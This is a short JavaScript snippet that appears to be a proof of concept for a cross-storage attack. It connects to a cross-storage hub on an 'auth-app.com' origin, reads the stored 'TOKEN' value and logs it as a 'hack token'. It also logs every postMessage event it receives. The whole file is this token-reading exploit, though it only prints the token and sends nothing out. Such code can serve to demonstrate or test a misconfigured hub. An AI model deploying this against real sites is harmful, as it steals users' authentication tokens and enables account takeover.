(function () {

  var client = new CrossStorageClient('http://auth-app.com/cross-storage-hub');

  client
    .onConnect()
    .then(function () {
      return client.get('TOKEN');
    })
    .then(function () {
      console.log('hack token', arguments);
    })
    .catch(function () {
      console.error('error while hacking the token', arguments);
    });

  if (window.addEventListener) {
    addEventListener('message', function () {
      console.log('on message event', arguments);
    }, false)
  }
})();
